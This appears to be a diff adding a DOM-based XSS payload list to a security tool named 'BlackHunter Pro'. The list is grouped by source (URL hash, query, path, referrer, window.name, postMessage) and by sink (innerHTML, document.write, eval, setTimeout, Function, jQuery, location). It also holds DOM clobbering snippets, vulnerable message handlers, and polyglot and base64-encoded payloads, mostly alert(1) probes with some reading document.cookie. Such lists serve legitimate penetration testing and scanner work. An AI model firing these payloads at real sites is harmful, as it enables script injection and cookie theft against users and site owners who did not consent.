@@ -1,0 +1,263 @@
+# payloads/xss/dom.txt
+# DOM-based XSS Payloads
+# BlackHunter Pro
+
+# =============================================
+# LOCATION.HASH SOURCE
+# =============================================
+
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+#<iframe src=javascript:alert(1)>
+#javascript:alert(1)
+#data:text/html,<script>alert(1)</script>
+#"><script>alert(1)</script>
+#'><script>alert(1)</script>
+#"><img src=x onerror=alert(1)>
+#'><img src=x onerror=alert(1)>
+#javascript:alert(document.cookie)
+#javascript:alert(document.domain)
+
+# =============================================
+# LOCATION.SEARCH SOURCE
+# =============================================
+
+?x=<script>alert(1)</script>
+?x=<img src=x onerror=alert(1)>
+?x=<svg onload=alert(1)>
+?x=javascript:alert(1)
+?x="><script>alert(1)</script>
+?x='><script>alert(1)</script>
+?x="><img src=x onerror=alert(1)>
+?x='><img src=x onerror=alert(1)>
+?redirect=javascript:alert(1)
+?url=javascript:alert(1)
+?next=javascript:alert(1)
+?return=javascript:alert(1)
+?returnUrl=javascript:alert(1)
+?callback=javascript:alert(1)
+?data=javascript:alert(1)
+?input=<script>alert(1)</script>
+?q=<img src=x onerror=alert(1)>
+?search=<svg onload=alert(1)>
+
+# =============================================
+# LOCATION.PATHNAME SOURCE
+# =============================================
+
+/<script>alert(1)</script>
+/<img src=x onerror=alert(1)>
+/<svg onload=alert(1)>
+/javascript:alert(1)
+/"><script>alert(1)</script>
+/'><script>alert(1)</script>
+/"><img src=x onerror=alert(1)>
+/'><img src=x onerror=alert(1)>
+
+# =============================================
+# DOCUMENT.URL SOURCE
+# =============================================
+
+#<script>alert(1)</script>
+?x=<script>alert(1)</script>
+/<script>alert(1)</script>
+
+# =============================================
+# DOCUMENT.REFERRER SOURCE
+# =============================================
+
+#<script>alert(1)</script>
+?ref=<script>alert(1)</script>
+referrer=<img src=x onerror=alert(1)>
+
+# =============================================
+# WINDOW.NAME SOURCE
+# =============================================
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+# =============================================
+# POSTMESSAGE SOURCE
+# =============================================
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+
+# =============================================
+# INNERHTML SINK
+# =============================================
+
+<div id=x></div>#<img src=x onerror=alert(1)>
+document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'
+document.getElementById('x').innerHTML='<script>alert(1)</script>'
+document.getElementById('x').innerHTML='<svg onload=alert(1)>'
+element.innerHTML='<img src=x onerror=alert(1)>'
+el.innerHTML=location.hash.slice(1)
+el.innerHTML=location.search.slice(1)
+el.innerHTML=document.URL
+el.innerHTML=document.referrer
+el.innerHTML=window.name
+
+# =============================================
+# OUTERHTML SINK
+# =============================================
+
+element.outerHTML='<img src=x onerror=alert(1)>'
+element.outerHTML='<script>alert(1)</script>'
+el.outerHTML=location.hash.slice(1)
+el.outerHTML=location.search.slice(1)
+
+# =============================================
+# DOCUMENT.WRITE SINK
+# =============================================
+
+document.write('<img src=x onerror=alert(1)>')
+document.write('<script>alert(1)</script>')
+document.write('<svg onload=alert(1)>')
+document.write(location.hash.slice(1))
+document.write(location.search.slice(1))
+document.write(document.URL)
+document.write(document.referrer)
+document.writeln('<img src=x onerror=alert(1)>')
+document.writeln('<script>alert(1)</script>')
+
+# =============================================
+# EVAL SINK
+# =============================================
+
+eval('alert(1)')
+eval(location.hash.slice(1))
+eval(location.search.slice(1))
+eval(document.URL)
+eval(document.referrer)
+eval(window.name)
+eval(decodeURIComponent(location.hash.slice(1)))
+
+# =============================================
+# SETTIMEOUT SINK
+# =============================================
+
+setTimeout('alert(1)',0)
+setTimeout('alert(1)',100)
+setTimeout(location.hash.slice(1),0)
+setTimeout(location.search.slice(1),0)
+setTimeout(document.URL,0)
+setTimeout`alert\x281\x29`
+setInterval('alert(1)',0)
+setInterval(location.hash.slice(1),0)
+setInterval`alert\x281\x29`
+
+# =============================================
+# FUNCTION SINK
+# =============================================
+
+Function('alert(1)')()
+new Function('alert(1)')()
+new Function('a','alert(a)')('XSS')
+Function(location.hash.slice(1))()
+new Function(location.search.slice(1))()
+
+# =============================================
+# JQUERY SINKS
+# =============================================
+
+$('<img src=x onerror=alert(1)>').appendTo('body')
+$('body').html('<img src=x onerror=alert(1)>')
+$('body').html('<script>alert(1)</script>')
+$('body').append('<img src=x onerror=alert(1)>')
+$('body').append('<script>alert(1)</script>')
+$('body').prepend('<img src=x onerror=alert(1)>')
+$('body').before('<img src=x onerror=alert(1)>')
+$('body').after('<img src=x onerror=alert(1)>')
+$('body').wrap('<img src=x onerror=alert(1)>')
+$('body').replaceWith('<img src=x onerror=alert(1)>')
+$('<script>alert(1)</script>').appendTo('body')
+$(location.hash)
+$(window.location.hash)
+$(location.search)
+$(document.URL)
+$(document.referrer)
+$(window.name)
+
+# =============================================
+# LOCATION SINKS
+# =============================================
+
+location.href='javascript:alert(1)'
+location.href=location.hash.slice(1)
+location.assign('javascript:alert(1)')
+location.assign(location.hash.slice(1))
+location.replace('javascript:alert(1)')
+location.replace(location.hash.slice(1))
+location='javascript:alert(1)'
+window.location='javascript:alert(1)'
+document.location='javascript:alert(1)'
+
+# =============================================
+# URL PARAMETER → DOM SINKS
+# =============================================
+
+?redirect=javascript:alert(1)
+?url=javascript:alert(1)
+?next=javascript:alert(1)
+?return=javascript:alert(1)
+?returnUrl=javascript:alert(1)
+?callback=javascript:alert(1)
+?data=javascript:alert(1)
+?input=<script>alert(1)</script>
+?q=<img src=x onerror=alert(1)>
+?search=<svg onload=alert(1)>
+?name=<script>alert(1)</script>
+?user=<img src=x onerror=alert(1)>
+?msg=<svg onload=alert(1)>
+?error=<script>alert(1)</script>
+?success=<img src=x onerror=alert(1)>
+?alert=<svg onload=alert(1)>
+?message=<script>alert(1)</script>
+?text=<img src=x onerror=alert(1)>
+?content=<svg onload=alert(1)>
+?body=<script>alert(1)</script>
+?html=<img src=x onerror=alert(1)>
+
+# =============================================
+# DOM CLOBBERING
+# =============================================
+
+<form id=x><input name=y></form>
+<img name=createElement>
+<img name=body>
+<img name=location>
+<img name=alert>
+<form id=alert><input name=alert></form>
+
+# =============================================
+# POSTMESSAGE EXPLOIT
+# =============================================
+
+<script>window.addEventListener('message',function(e){eval(e.data)})</script>
+<script>window.onmessage=function(e){eval(e.data)}</script>
+<script>window.addEventListener('message',function(e){document.write(e.data)})</script>
+<script>window.addEventListener('message',function(e){document.body.innerHTML=e.data})</script>
+<script>window.onmessage=function(e){document.body.innerHTML=e.data}</script>
+
+# =============================================
+# ADVANCED DOM PAYLOADS
+# =============================================
+
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+'">><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+'><img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+javascript:alert(1)//
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
